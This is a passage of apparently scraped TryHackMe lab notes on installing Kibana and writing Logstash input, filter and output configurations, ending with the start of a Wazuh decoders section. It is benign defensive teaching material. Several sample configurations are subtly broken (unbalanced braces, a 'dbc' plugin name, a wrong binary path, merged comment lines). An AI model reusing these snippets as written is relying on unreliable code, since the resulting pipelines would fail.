patterns that can be used in Logstash’s grok filter. Grok is a powerful
pattern-matching and extraction tool in Logstash, and you can define
your own patterns in separate files within this directory.
- `startup.options`: On some systems, you may find this
file which contains additional options and arguments that can be passed
to Logstash during startup.

Let’s open the logstash.yml using the command
`nano logstash.yml` and go to the
`Pipeline Configuration Settings` section, as shown
below:

```c
# ---------------------------------------Pipeline Configuration Settings------------------------------------------
# Where to fetch the pipeline configuration for the main pipeline # path.config: # Pipeline configuration string for the main pipeline # config.string: # At startup, test if the configuration is valid and exit (dry run) # config.test_and_exit: false # Periodically check if the configuration has changed and reload the pipeline# This can also be triggered manually through the SIGHUP signal#
 config.reload.automatic: true
#
# How often to check if the pipeline configuration has changed (in seconds)# Note that the unit value (s) is required. Values without a qualifier (e.g. 60) # are treated as nanoseconds.# Setting the interval this way is not recommended and might change in later versions.#
 config.reload.interval: 3s#
 Show fully compiled configuration as debug log message# NOTE: --log.level must be 'debug'# config.debug: false# When enabled, process escaped characters such as \n and \" in strings in the# pipeline configuration files.# config.support_escapes: false
```

There are two updates that we need to make. Uncomment both the
following variables and change the value of
`config.reload.automatic:` to `true`, as shown
below:

1. config.reload.automatic: true
2. config.reload.interval: 3s

These changes will ensure Logstash looks at the configuration files
every 3 seconds to see if there are any changes to the log sources which are being ingested.

Logstash: Restart

```
root@tryhackme:/etc/logstash# systemctl restart logstash.service
```

Now that we have installed and configured Logstash properly, let’s
move on to the next task and install the Kibana component.

**Kibana: Installation and Configuration**

### Installing Kibana

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/bbf55904395c6396c41a2c8187927797.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/bbf55904395c6396c41a2c8187927797.svg)

We have already explored the Kibana interface in the [InvestigatingwithELK](https://tryhackme.com/room/investigatingwithelk101)
room. Let’s now go through the process of installing Kibana on the 
Ubuntu lab. The latest installation instance is placed on the path
`/home/tools/kibana`.

Kibana

```
root@tryhackme:/home/tools/kibana# lskibana.deb
```

Run the following command `dpkg -i kibana` as a root user
to install the Kibana on the server. It will take 1-2 minutes to
get installed, as shown below:

Kibana Installation

```
root@tryhackme:/home/tools/kibana# dpkg -i kibana.deb Selecting previously unselected package kibana.
(Reading database ... 321252 files and directories currently installed.)
Preparing to unpack kibana.deb ...
Unpacking kibana (8.8.0) ...
Setting up kibana (8.8.0) ...
Creating kibana group... OK
Creating kibana user... OK
Created Kibana keystore in /etc/kibana/kibana.keystore
```

If all goes well, Kibana will be installed on the host.

### Kibana: Persistence

We will use the following commands to make the Kibana service
persistent.

Kibana: Persistence

```
root@tryhackme:/etc/kibana# systemctl daemon-reloadroot@tryhackme:/etc/kibana# systemctl enable kibana.serviceCreated symlink /etc/systemd/system/multi-user.target.wants/kibana.service → /lib/systemd/system/kibana.service.
root@tryhackme:/etc/kibana# systemctl start kibana.service
```

### Kibana Status

Now that we have installed Kibana successfully, let’s check its
status to see if it's installed and running properly.

Kibana: Status

```
root@tryhackme:/etc/kibana# systemctl status kibana.service● kibana.service -Kibana
     Loaded: loaded (/lib/systemd/system/kibana.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2023-06-07 14:08:06 UTC; 36s ago
       Docs: https://www.elastic.co
   Main PID: 6251 (node)
      Tasks: 11 (limit: 4710)
     Memory: 388.5M
     CGroup: /system.slice/kibana.service
             └─6251 /usr/share/kibana/bin/../node/bin/node /usr/share/kibana/bin/../src/cli/dist

Jun 07 14:08:33 tryhackme kibana[6251]: [2023-06-07T14:08:33.621+00:00][INFO ][plugins-service] Plugin "cloudExperiments" is disabled.
Jun 07 14:08:33 tryhackme kibana[6251]: [2023-06-07T14:08:33.621+00:00][INFO ][plugins-service] Plugin "cloudFullStory" is disabled.
Jun 07 14:08:33 tryhackme kibana[6251]: [2023-06-07T14:08:33.621+00:00][INFO ][plugins-service] Plugin "cloudGainsight" is disabled.
Jun 07 14:08:33 tryhackme kibana[6251]: [2023-06-07T14:08:33.666+00:00][INFO ][plugins-service] Plugin "profiling" is disabled.
Jun 07 14:08:33 tryhackme kibana[6251]: [2023-06-07T14:08:33.799+00:00][INFO ][http.server.Preboot] http server running at http://localhost>
Jun 07 14:08:34 tryhackme kibana[6251]: [2023-06-07T14:08:34.006+00:00][INFO ][plugins-system.preboot] Setting up [1] plugins: [interactive>
Jun 07 14:08:34 tryhackme kibana[6251]: [2023-06-07T14:08:34.010+00:00][INFO ][preboot] "interactiveSetup" plugin is holding setup: Validat>
Jun 07 14:08:34 tryhackme kibana[6251]: [2023-06-07T14:08:34.054+00:00][INFO ][root] Holding setup until preboot stage is completed.
Jun 07 14:08:34 tryhackme kibana[6251]: i Kibana has not been configured.
Jun 07 14:08:34 tryhackme kibana[6251]: Go to http://localhost:5601/?code=475559 to get started.
```

### Configuring Kibana

The `/etc/kibana` path typically contains the
configuration files for Kibana, an open-source data visualization and
exploration tool. Here are the commonly found files in the
`/etc/kibana` directory:

Kibana: Directory

```
root@tryhackme:/etc/kibana# lskibana.keystore  kibana.yml  node.options
```

Two important files are explained below:

- **kibana.yml**: This is the main configuration file for
Kibana. It contains various settings to customize Kibana’s behavior,
such as the Elasticsearch server URL, server host and port, logging
options, security configurations, and more. You can modify this file to
tailor Kibana to your specific environment.
- **kibana.keystore**: This file securely stores sensitive configuration settings, such as passwords and API keys.
The `kibana.keystore` file provides a safer alternative to
storing sensitive information in plain text within the
`kibana.yml` file. It is encrypted and can be managed using
the `bin/kibana-keystore` command-line tool.

To configure Kibana, open the kibana.yml using the command
`nano kibana.yml` and go to the
`System: Kibana Server section`, as shown below:

```c
# =================== System:Kibana Server ===================
#Kibana is served by a back end server. This setting specifies the port to use.
server.port: 5601

# Specifies the address to which theKibana server will bind. IP addresses and host names are both valid values.# The default is 'localhost', which usually means remote machines will not be able to connect.# To allow connections from remote users, set this parameter to a non-loopback address.
server.host: "0.0.0.0"

# Enables you to specify a path to mountKibana at if you are running behind a proxy.# Use the `server.rewriteBasePath` setting to tellKibana if it should remove the basePath# from requests it receives, and to prevent a deprecation warning at startup.# This setting cannot end in a slash.#server.basePath: ""....
.........
...........
# =================== System:Elasticsearch ===================
# The URLs of theElasticsearch instances to use for all your queries.
elasticsearch.hosts: ["http://localhost:9200"]

# If yourElasticsearch is protected with basic authentication, these settings provide# the username and password that theKibana server uses to perform maintenance on the Kibana# index at startup. YourKibana users still need to authenticate with Elasticsearch, which# is proxied through theKibana server.#elasticsearch.username: "kibana_system"#elasticsearch.password: "pass"
```

Uncomment the following two variables and make the changes to
`server.host` as shown below:

- `server.port: 5601` => Kibana runs on port
5601 by default.
- `server.host: "0.0.0.0"`
=> This is important to note that; if the server IP is changed, it
should be updated here. The server's IP does not change in a production
environment; in that case, this parameter will not be changed often.

Once the changes are made, and the config file is saved, its time to
restart the Kibana server using the following command:

Kibana: Restart

```
root@tryhackme:/etc/kibana# systemctl restart kibana.service
```

Open the browser, and go to [10.10.135.74:5601](http://10.10.135.74:5601/); we will see
a Kibana Interface. We will need to generate an enrollment token for the Kibana
instance using the following command
`/usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s kibana`.
It will show a randomly generated token. Enter the token in the space
and press Enter. It will ask for the elastic credentials. There are the
same credentials that were generated during the installation of Elasticsearch:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/44668b7de60f049724b5b125335358ad.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/44668b7de60f049724b5b125335358ad.png)

Next, it will ask for the verification code, which can be obtained by
running this command `/usr/share/kibana/bin/kibana-verification-code`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0ee717a97cf0c8e2f82fe98f990b30cc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0ee717a97cf0c8e2f82fe98f990b30cc.png)

Congrats, ELK is installed properly:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/84579fd22101e079f9fd45ee4e467528.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/84579fd22101e079f9fd45ee4e467528.png)

Kibana can be used to visualize the logs that are parsed, and filtered from Logstash.

**Note:** As we are focused on Logstash in this room, please stop the Kibana service to avoid VM slowing down. Use the command `systemctl stop kibana.service` to stop Kibana.

**Logstash: Overview**

Let's dive deep into the details of Logstash.

Logstash is a data processing engine that takes data from different sources, applies the filter or normalizes it, and then sends
it to the destination, Kibana, or a listening port. A Logstash
configuration file is divided into three parts, as shown below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/374be2b61246be37167878285a47f9b4.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/374be2b61246be37167878285a47f9b4.svg)

Each part is explained in detail below:

### Input

Logstash provides a wide range of input plugins that allow you to
ingest data from diverse sources such as log files, system metrics,
databases, message queues, APIs, and more. These input plugins
facilitate data collection in various formats and protocols, as
shown in the [reference document](https://www.elastic.co/guide/en/logstash/current/input-plugins.html).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6828f5f83f1da3c57528a6a6406c06fb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6828f5f83f1da3c57528a6a6406c06fb.png)

Below is the list of the top 10 input plugins with a brief explanation:

| Plugin Name | Description |
| --- | --- |
| File | Reads data from files in real-time or as a batch. Useful for
ingesting log files or other structured data stored on the local file
system. |
| Beats | Ingests data from Beats shippers (such as Filebeat or Metricbeat),
lightweight agents designed to ship various data types to
Logstash. |
| TCP | Listens for incoming TCP connections and reads data from them.
Useful for receiving data from network devices or other systems over
TCP. |
| UDP | Listens for incoming UDP packets and reads data from them. Ideal for
receiving log data or other types of data sent over UDP. |
| Syslog | Collects logs sent in the Syslog format over UDP or TCP and is commonly
used for gathering logs from various network devices or
applications. |
| HTTP | Acts as a web server and reads data from HTTP requests.
Useful for receiving data from webhooks, REST APIs, or other HTTP-based
sources. |
| JMX | Monitors Java applications by connecting to Java Management
Extensions (JMX) and collecting metrics and other data. |
| SNMP Trap | Receives SNMP traps, which are notifications sent by network devices
to alert management systems of specific events. |
| RabbitMQ | Consumes messages from a RabbitMQ message broker. Enables Logstash
to receive data from other systems via RabbitMQ. |
| Amazon S3 | Downloads objects from Amazon S3 buckets. Useful for ingesting data
stored in S3, such as log files or other files in various formats. |

### Filter

Once the data is ingested, Logstash provides a rich set of filter
plugins that enable you to manipulate and transform the data. Filters
allow you to parse, enrich, modify, and filter incoming data. You
can perform operations like extracting specific fields, converting data
formats, applying regular expressions, adding timestamps, and enriching
data with external sources. Logstash supports many filter plugins, as
shown in the [reference documentation](https://www.elastic.co/guide/en/logstash/current/filter-plugins.html).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/09443f7a37d95159e5ac7f1e92779ed0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/09443f7a37d95159e5ac7f1e92779ed0.png)

It's important to note that the filter part is optional. Whether we 
want to apply filters or not depends on the use case. Below is the list 
of
the top 10 input plugins with a brief explanation:

| Plugin Name | Description |
| --- | --- |
| Grok | Parses unstructured log data using custom patterns and extracts
structured fields from it. |
| Mutate | Performs various mutations on event fields, such as renaming,
removing, converting data types, and more. |
| Date | Parses and manipulates dates and timestamps in event fields. Allows
you to extract, format, or convert timestamps to a desired configuration. |
| JSON | Parses JSON-encoded strings in event fields and converts them into
structured data. Useful for working with JSON log files or
messages. |
| CSV | Parses comma-separated values (CSV) data in event fields and
converts them into structured data. |
| GeoIP | Enriches IP addresses in event fields with geographical information,
such as country, city, latitude, and longitude. |
| UserAgent | Parses User-Agent strings in event fields and extracts information
about the client or device making the request. |
| Drop | Drops events that match specific conditions. Useful for filtering
out unwanted events based on certain criteria. |
| Translate | Translates values in event fields based on defined mappings. It can be
used for data normalization or mapping codes to meaningful values. |
| DNS | Performs DNS (Domain Name System) lookups on event fields containing
IP addresses or hostnames and provides additional
information. |

### Output

After the data is processed through filters, Logstash provides output
plugins to send the transformed data to different destinations. These
destinations can include Elasticsearch for indexing and search, various
databases, message queues, cloud storage services, monitoring systems,
and more. The [reference documentation](https://www.elastic.co/guide/en/logstash/current/output-plugins.html) shows that Logstash supports various output plugins to accommodate different integration requirements.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3ec39419529647e5eaf01d11f8b145ab.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3ec39419529647e5eaf01d11f8b145ab.png)

We can use one or more output destinations depending on the requirement. Some of the common output plugins are explained below:

| Plugin Name | Description |
| --- | --- |
| Elasticsearch | Sends events to Elasticsearch, a popular search and analytics
engine. Allows you to index and store data for further analysis and
search. |
| File | Writes events to files on the local file system or a network-mounted
file system. Useful for storing data locally or archiving log
files. |
| STDOUT | Prints events to the console (standard output). Useful for debugging
or quick data inspection. |
| Kafka | Produces messages to an Apache Kafka message broker. Enables
Logstash to send data to other systems via Kafka. |
| Redis | Pushes events to a Redis data structure server. Useful for
publishing data to other systems or building real-time dashboards. |
| Amazon S3 | Uploads events to Amazon S3 buckets. Useful for storing data in S3
for long-term storage or backup purposes. |
| Graphite | Sends events to a Graphite server, commonly used for real-time graphing and metrics monitoring. |
| StatsD | Sends metrics data to a StatsD server for aggregation and
monitoring. They are commonly used in conjunction with Graphite or other
monitoring tools. |
| Logz.io | Ships events to Logz.io, a cloud-based log management and analytics
platform. Suitable for centralized log analysis and monitoring. |
| InfluxDB | Writes events to an InfluxDB time-series database. Useful for
storing and analyzing timestamped data, such as metrics or sensor
readings. |

In the coming tasks, we will use most of these plugins to get
the data, parse, and output to the destination of choice.

**Writing Configurations**

While setting up Logstash, we made the changes in the Logstash configuration file `logstash.yml` to look at the configurations every 3 seconds to observe
the changes to the files it monitors. The configuration files are located in the `/etc/logstash/conf.d/` directory. Let's now go through the process of writing a simple configuration file.

**Example:**Take the input from TCP port 5456, which sends JSON
formatted logs, apply the appropriate filter, and send it to
Elasticsearch.

### 1) Input: tcp

For the above example, we will take a look at the [TCP
plugin documentation](https://www.elastic.co/guide/en/logstash/current/plugins-inputs-tcp.html). In the configuration options, only the port field
is required, which means we can use the TCP plugin by only mentioning
the TCP port, which we want the Logstash to listen to.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2558ced5de3243511a3299fd2ecd72b7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2558ced5de3243511a3299fd2ecd72b7.png)

The input part of the configuration based on the above information
would look like:

```c
input                                                                                                                                                  {
       tcp {
               port => 5456
           }
 }
```

It is important to note that, in the configurations, we will use
`=>` the field value pairs, as shown in the above
example.

### 2) Filter

The input stream is in JSON format; let’s explore the JSON plugin documentation and see which fields are required.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/556509f9dd53ce8306a033604d265074.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/556509f9dd53ce8306a033604d265074.png)

The configuration shows we need to mention the source. Click on the
source field, and it will show further details on how to use this option,
along with the example.

Based on the information provided above, our filter configuration
would be:

```c
filter                                                                                                                                           { json      { source => "message"       } }
```

### 3) Output

As we want to send our output to Elasticsearch that we configured
earlier, let’s look at the [Elasticsearch
output configuration](https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/def79acf019bc37889db482f3ea97403.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/def79acf019bc37889db482f3ea97403.png)

The configuration shows that no
field is mandatory. But still, we will use the fields like host and
index to show the host address and the index where we want the data to
be indexed. The final output configuration would look like this:

```c
output                                                                                                                                      {
  elasticsearch    {
                hosts => ["localhost:9200"]
                index => "your_index_name"
      }

}
```

# Final Configuration:

Now that we have written the configuration that takes the input from the TCP port 5456, applies the filter and sends it to Elasticsearch, our
final configuration would look like this:

```c
input                                                                                                                                      {
  tcp    {
    port => 5456
      }
}

filter {
         json      {
        source => "message"
      }
    }

output  {
       elasticsearch            {
    hosts => ["localhost:9200"]
                 index => "your_index_name"
             }

}
```

What’s next? We will save this configuration with the extension `<any name>.conf` into the path
`/etc/logstash/conf.d/` to make it work.

In the next task, we will create some configurations using different
plugins.

**Logstash: Input Configurations**

So far, we have explored Logstash, its components, and how different
plugins are used with the help of official documentation. Let’s explore a few common input plugins and their usages, along with
the corresponding configurations:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2f0748f2debc945daefc68acc3afb6c5.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2f0748f2debc945daefc68acc3afb6c5.svg)

# File Input Plugin

This plugin reads data from files on the local system or network.

```c
input
{
     file
          {
                     path => "/path/to/your/file.log"
                     start_position => "beginning"
                     sincedb_path => "/dev/null"
           }
 }
```

- `path`: Specifies the path to the file(s) to be
read.
- `start_position`: Defines where Logstash should start
reading the file. In this example, “beginning” means it will start
reading from the beginning of the file.
- `sincedb_path`: Sets the path to the sincedb file, which
keeps track of the current position of the file read.

# Beats Input Plugin

This plugin receives data from Beats, lightweight shippers that send
data to Logstash.

```c
input
{
    beats
          {
                     port => 5055
           }
 }
```

- `port`: Specifies the port number on which Logstash
should listen for Beats connections.

# TCP

This plugin listens for data on a specified TCP port.

```c
input
{
    tcp
          {
                     port => 5055
                     codec => json
           }
 }
```

- `port`: Sets the TCP port on which Logstash should listen
for incoming data.
- `codec`: Defines the codec to be used for decoding the
incoming data. In this example, the data is expected to be in JSON
format

# UDP

This plugin listens for data on a specified UDP port.

```c
input
{
    udp
          {
                     port => 514
                     codec => "plain"
           }
 }
```

- `port`: Sets the UDP port on which Logstash should listen
for incoming data.
- `codec`: Specifies the codec to be used for decoding the
incoming data. In this example, the data is treated as plain text.

# HTTP

This plugin sets up an HTTP endpoint to receive data via HTTP
requests.

```c
input
{
    http
          {
                     port => 5055
           }
 }
```

- `port`: Specifies the HTTP port on which Logstash should
listen for incoming HTTP requests

Each input plugin provides specific configuration options 
tailored to
its functionality and requirements. The examples above demonstrate 
configuring the plugins by specifying the necessary settings, such as
file paths, ports, and codecs. You can further customize these
configurations based on your specific use case and the data sources you
are working with. The Logstash documentation provides comprehensive
information on each input plugin and its available configuration
options.

**Logstash: Filter Configurations**

# Filters

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/aaacf8434d8db0e31969d2214ff35abd.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/aaacf8434d8db0e31969d2214ff35abd.svg)

Let’s now explore different filter plugins and how they are used in
Logstash configuration with some examples:

### Adding a field using
the mutate filter

```c
filter
{
    mutate
    {
                add_field => { "new_field" => "new_value" }
    }
 }
```

**Explanation:** This configuration utilizes the mutate
filter to add a new field called `new_field` with the value
`"new_value"` to each event. The mutate filter provides
various operations for modifying fields.

### Converting a field to lowercase using the mutate filter

```c
filter
{
    mutate
    {
                lowercase => ["field_name"]   }
    }
 }
```

**Explanation:** This configuration employs the mutate
filter to convert the value of the `field_name` field to
lowercase. The original value will be replaced with its lowercase
equivalent.

### Extracting data using
the grok filter

```c
filter
{
    grok
    {
                match => { "message" => "%{PATTERN:field_name}" }
    }
 }
```

**Explanation:** This configuration uses the grok filter
to extract data from the `message` field based on a
predefined pattern (`%{PATTERN}`). The extracted data will be
stored in a new field called `field_name`.

### Removing empty
fields using the prune filter

```c
filter
{
    prune
    {
                whitelist_names => ["field1", "field2"]   }
    }
 }
```

**Explanation:** This configuration utilizes the prune
filter to remove empty fields from the event, except for those specified
in the `whitelist_names` parameter. Only fields
`field1` and `field2` will be retained in the
event.

### Replacing
field values using the translate filter

```c
filter
{
    translate
    {
                field => "country"
                destination => "country_name"
                dictionary => {       "US" => "United States"   "CA" => "Canada"   }
    }
 }
```

Explanation: This configuration utilizes the translate filter to
replace the value of the `country` field with its
corresponding value from the dictionary. For example, if the
`country` field is `"US"`, it will be replaced
with `"United States"`, and if it is `"CA"`, it
will be replaced with `"Canada"`.

### Dropping events based on a condition using the if-else statement

```c
filter
{
   if [status] == "error"
   {     drop { }
     }
   else {
      # Perform additional transformations or filters   }}
```

**Explanation:** In this configuration, the if-else
statement checks the value of the `status` field. If the
value is `"error"`, the event is dropped using the drop
filter. Otherwise, if the condition is not met, the event proceeds for
further transformations or filters.

### Parsing
key-value pairs using the kv filter

```c
filter
{
    kv
    {
        field_split => "&"     value_split => "="
    }
 }
```

**Explanation:** This configuration uses the kv filter
to parse key-value pairs in a field. The `field_split`
parameter specifies the delimiter between key-value pairs
(`&` in this case), and the `value_split`
parameter specifies the delimiter between keys and values
(`=` in this case).

### Performing
conditional field renaming using the rename filter

```c
filter
{  mutate {
    rename
    {
                "old_field" => "new_field"
                add_field => { "another_field" => "value" }
    }
 }}
```

Explanation: This configuration employs the rename filter to rename
the field `old_field` to `new_field`.
Additionally, it adds a new field called `another_field` with
the value `"value"`. The rename filter allows for conditional
field renaming.

**Logstash: Output Plugin**

# Output

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/73e1bf6ea9ca237976704fcb47e68e6f.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/73e1bf6ea9ca237976704fcb47e68e6f.svg)

The output section of the Logstash configuration file is where you
define the destination for processed events. It specifies where Logstash
should send the transformed data. Some of the common examples of
Logstash output plugins and their configurations:

### Sending data to Elasticsearch using the elasticsearch output plugin

```c
output
{
    elasticsearch
    {
                hosts => ["localhost:9200"]
                index => "my_index"
    }
 }
```

**Explanation:** This configuration uses the
elasticsearch output plugin to send events to an Elasticsearch cluster.
The `hosts` parameter specifies the Elasticsearch server’s
address and defines the index name
where the data will be stored.

### Writing
data to a file using the file output plugin

```c
output
{
    file
    {
                path => "/path/to/output.txt"
    }
 }
```

**Explanation:** This configuration utilizes the file
output plugin to write events to a specified file
(`/path/to/output.txt`). Each event will be appended to the
file as a separate line.

### Sending data to a message queue using the rabbitmq output plugin

```c
output
{
   rabbitmq
   {
               host => "localhost"
               exchange => "my_exchange"
               routing_key => "my_routing_key"
    }
 }
```

**Explanation:** This configuration configures the
rabbitmq output plugin to send events to a RabbitMQ server. The
`host` parameter specifies the RabbitMQ server’s address,
while `exchange` and `routing_key` define the
exchange and routing key for message routing within RabbitMQ.

### Forwarding data to another Logstash instance using the logstash output
plugin

```c
output
{
    logstash
       {
                host => "destination_host"
                port => 5000   }
 }
```

**Explanation:** This configuration sets up the logstash
output plugin to forward events to another Logstash instance. The
`host` parameter specifies the destination Logstash server’s
address, and the `port` parameter defines the port to which
the events will be sent.

### Sending data to a database using the jdbc output plugin

```c
output
{
    dbc
    {
        connection_string => "jdbc:mysql://localhost:3306/mydb"
        statement => "INSERT INTO mytable (field1, field2) VALUES (?, ?)"
        parameters => ["%{field1}", "%{field2}"]
    }
 }
```

**Explanation:** This configuration utilizes the jdbc output plugin to
insert events into a MySQL database. The `connection_string`
parameter specifies the database connection details, and the
`statement` parameter defines the SQL INSERT statement. The
`parameters` parameter provides values for the placeholders
in the statement.

# Forwarding data to a server using the tcp output plugin

```c
output
{
    tcp
    {
        host => "destination_host"
        port => 5000
    }
 }
```

**Explanation:** This configuration sets up the tcp output plugin to
forward events to a remote TCP server. The `host` parameter
specifies the destination server’s address, and the `port`
parameter defines the port to which the events will be sent.

### Sending data to a message broker using the kafka output plugin

```c
output
{
    kafka
      {
              bootstrap_servers => "kafka_host:9092"
              topic_id => "my_topic"
      }
 }
```

**Explanation:** This configuration utilizes the kafka
output plugin to publish events to an Apache Kafka topic. The
`bootstrap_servers` parameter specifies the Kafka server’s
address, and the `topic_id` parameter defines the topic to
which the events will be sent.

### Forwarding data to a WebSocket endpoint using the websocket output
plugin

```c
output
{
   websocket
        {
                url => "ws://localhost:8080/my_endpoint"
        }
 }
```

**Explanation:** This configuration creates the websocket output plugin
to send events to a WebSocket endpoint. The `url` parameter
specifies the WebSocket server’s URL and the specific endpoint
(`/my_endpoint`) to which the events will be sent.

### Sending data to a Syslog server using the syslog output plugin

```c
output
{
     syslog
             {
                 host => "syslog_server"
                 port => 514
                 protocol => "udp"
             }
 }
```

**Explanation:** This configuration configures the syslog output plugin
to send events to a Syslog server. The `host` parameter
specifies the Syslog server’s address, the `port` parameter
defines the port to which the events will be sent, and the
`protocol` parameter specifies the transport protocol (in
this case, UDP).

### Writing data to the console for debugging using the stdout output
plugin

```c
output
{
    stdout {
    }
 }
```

**Explanation:** This configuration uses the stdout output plugin to
print events to the console. It is primarily used for debugging purposes
to visually inspect the processed events and verify the Logstash
pipeline’s transformations.

These examples demonstrate a variety of output plugins available in
Logstash, each serving a specific purpose to send data to different
destinations or systems. We can choose the appropriate output plugin
based on our requirements and desired data flow.

**Logstash: Running Configurations**

Let’s recall the

Logstash

components below.

This image can be represented in configuration as follows:

```c
input
{
 filter {
    }
output{

}
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f602853cda3f44bea8495c07f5f563fc.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f602853cda3f44bea8495c07f5f563fc.svg)

Logstash configurations are placed at `/etc/logstash/conf.d/` for the
logstash to read.

# Configuration# 1: Stdin/Stdout

Let’s take a simple illustration below:

As we already know, Logtash provides various [input
plugins](https://www.elastic.co/guide/en/logstash/current/input-plugins.html), which can be used to take input from different
sources.

In our first example, we will take the input from the terminal using
the [stdin
plugin](https://www.elastic.co/guide/en/logstash/current/plugins-inputs-stdin.html) and send the output back to the terminal using the output
plugin [stdout](https://www.elastic.co/guide/en/logstash/current/plugins-outputs-stdout.html).

The configuration file would look like this:

```c
input{

stdin{}

output{
   stdout{}
   }
```

We can skip that because we are not using any filters in this example.
Let’s try this out using the following command:

```c
/usr/share/logstash/bin/logstash -e 'input{ stdin{}} output{ stdout{} }'
```

Logstash

```
root@tryhackme:/usr/share/logstash# ./bin/logstash -e 'input{stdin{}} output{stdout{}}'......
......
HELLO
WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaults
Could not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the console

{
      "@version" => "1",
          "host" => {
        "hostname" => "ip-10-10-156-46"
    },
       "message" => "HELLO",
    "@timestamp" => 2023-06-08T15:05:23.141844620Z,
         "event" => {
        "original" => "HELLO"
    }
}
Welcome to the TRYHACKME Learning Lab
{
      "@version" => "1",
          "host" => {
        "hostname" => "ip-10-10-156-46"
    },
       "message" => "Welcome to the TRYHACKME Learning Lab",
    "@timestamp" => 2023-06-08T15:05:47.309850247Z,
         "event" => {
        "original" => "Welcome to the TRYHACKME Learning Lab"
    }
}
```

In the above examples, we entered two inputs `HELLO` and
`Welcome to the TRYHACKME Learning Lab`. Both were reflected
back on the terminal, as we used stdout to output the data without
applying any filters.

# Configuration #2: Reading authentication logs

Now, we will see how we can get authentication logs located at `/var/log/auth.log`, apply some filters, and send them over to the
destination of our choice.

```c
input {
  file {
    path => "/var/log/auth.log"
    start_position => "beginning"
    sincedb_path => "/dev/null"
  }
}

filter {
  if [message] =~ /^(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})/
  {
    # Extract the timestamp from the log entry
    date {
      match => [ "message", "MMM d HH:mm:ss", "MMM dd HH:mm:ss" ]
      target => "@timestamp"
    }
  }

}

output {
  file {
    path => "/root/home/Desktop/logstash_output.log"
  }
}
```

Save this configuration to a file called `logstash.conf` and run
the following command from the location:

`/usr/share/bin/logstash`

`logstash -f logstash.conf`

Logstash will start reading the auth logs, apply the defined filters,
and write the filtered logs to the specified file on your Desktop.

**Excercise and Conclusion**

A simple example is to examine the web-attack.csv file. We will write a configuration, apply a filter to add corresponding columns, and send the output to another file on the Desktop. The configuration file below shows an example of how to do this:
input { file { path => "/home/Desktop/web_attacks.csv" start_position => "beginning" sincedb_path => "/dev/null" } } filter { csv { separator => "," columns => ["timestamp", "ip_address", "request", "referrer", "user_agent", "attack_type"] } # Add any additional filters you need here # Example: Filter by specific attack types (optional) if [attack_type] =~ /SQL Injection|Brute Force/ { # Perform any necessary actions for the filtered logs } } output { file { path => /home/Desktop/updated-web-attacks.csv } }
ConclusionWell, that's it from this room. It was an interesting topic to cover. Logstash helps us efficiently examine the logs after parsing and applying necessary filters, as we covered in the room. The topics we covered in this room are:
How to install and configure ELK components.What are different input, filter, and output plugins available?Exploring the Logstash documentation.How to write simply to complex configurations.There will be a next part of this room, where we will explore some realistic log sources and examine them in Kibana to visualize better and analyze them.

**CUSTOM ALERT RULES IN WAZUH**

**Decoders**

One of the many features of Wazuh
 is that it can ingest logs from different sources and generate alerts 
based on their contents. However, various logs can have varied data 
types and structures. To manage this, Wazuh uses Decoders that use regex
 to extract only the needed data for later use.

# Understanding Decoders

